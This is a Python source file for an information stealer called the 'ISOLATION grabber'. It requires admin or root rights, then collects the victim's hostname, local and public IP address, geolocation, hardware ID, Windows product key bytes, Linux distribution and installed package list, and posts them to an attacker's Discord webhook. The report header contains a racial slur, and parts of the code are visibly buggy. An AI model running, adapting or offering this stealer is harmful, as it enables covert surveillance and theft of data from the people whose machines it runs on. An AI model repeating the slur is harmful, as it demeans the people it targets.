import ctypes, sys, platform
if platform.system() == "Windows":
    import ctypes
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    if is_admin():
        pass
    else:
        sys.exit("Rerun with Administrator priv.")
else:
    def has_sudo():
        return os.geteuid() == 0
    if has_sudo():
        pass
    else:
        sys.exit("Rerun with Sudo or Root")
import os
import discord_webhook
import json
import platform
import socket
import subprocess
import requests
from urllib.request import urlopen
    
# pre-run needed variables
os.chdir(os.path.dirname(os.path.abspath(__file__)))
config_file = open("./CONFIG.json","r")
config = json.load(config_file)

hostname=socket.gethostname()
localIPAddr=socket.gethostbyname(hostname)
IPAddr = requests.get("https://checkip.amazonaws.com")
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

if platform.system()=="Windows":
    hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
else:
    hwid = subprocess.check_output(['cat', '/etc/machine-id'])

pcname = os.path.expanduser("~")

data_link = f"https://ipinfo.io/{IPAddr.text[:-2]}/json"
respons = urlopen(data_link)
data = json.load(respons)

def get_windows_product_key():
    try:
        import winreg
        key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
        value_name = "DigitalProductId"

        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
            product_key_bytes = winreg.QueryValueEx(key, value_name)[0]
        
        product_key = ""
        for b in product_key_bytes[52:67]:
            product_key += "%02x" % b
            return product_key
    except:
        return platform.system()
def get_linux_distro():
    try:
        with open('/etc/os-release', 'r') as f:
            lines = f.readlines()
            distro_name = ""
            distro_id = ""

            for line in lines:
                if line.startswith('PRETTY_NAME='):
                    distro_name = line.split('=')[1].strip().strip('"')
                elif line.startswith('ID='):
                    distro_id = line.split('=')[1].strip().strip('"')
                    break  # Stop reading after finding the ID field

            if distro_id == "arch":
                return f"{distro_name} (Based on Arch)"
            elif distro_id == "debian":
                return f"{distro_name} (Based on Debian)"
            else:
                return f"{distro_name} (Custom or Unknown)"
    except FileNotFoundError:
        pass
    
    return "Unknown"
# webhook
embedcont = f'''
---------------------
get grabbed nigga
---------------------
Operating system >> {platform.system()}
OS.name -------- >> {os.name}
HostName ------- >> {hostname}
pc name -------- >> {pcname}
local Ip Address >> {localIPAddr}
Ip Address ----- >> {IPAddr.text}HWID             >> {hwid}
ORG ------------ >> {data["org"]}
ORG hostname --- >> {data["hostname"]}
City ----------- >> {data["city"]}
Region --------- >> {data["region"]}
Country -------- >> {data["country"]}
Location ------- >> {data["loc"]}
Postal --------- >> {data["postal"]}

-----WINDOWS ONLY----
Key ------------ >> {get_windows_product_key()}

------LINUX ONLY-----
Distribution: {get_linux_distro()}

'''

def get_system_info():
    if platform.system() == 'Linux':
        try:
            packages = subprocess.check_output(['dpkg', '--get-selections']).decode('utf-8').split('\n')
            return [line.split('\t')[0] for line in packages if line]
        except subprocess.CalledProcessError:
            return []
    else:
        platform.system()

def save_to_file(filename,data):
    with open(filename, 'w') as f:
        for item in data:
            f.write(item + '\n')
systm_packages = get_system_info()
save_to_file(systm_packages, "packages.txt")

def main():
    webhook = discord_webhook.DiscordWebhook(url=str(config["WEBHOOK"]),rate_limit_retry= True)
    embed = discord_webhook.DiscordEmbed(title="ISOLATION",description=embedcont, color="23272A")
    embed.set_timestamp()
    embed.set_footer(text="Grabbed w/ ISOLATION grabber")
    embed.set_thumbnail("https://media.discordapp.net/attachments/1136359120233046057/1142457082243711007/1e35053d0cd075d470bd6a80a2a9a1c1.png?width=449&height=449")
    webhook.add_embed(embed=embed)
    webhook.add_file(file="packages.txt",filename="packages.txt")
    webhook.execute()
if __name__== "__main__":
    main()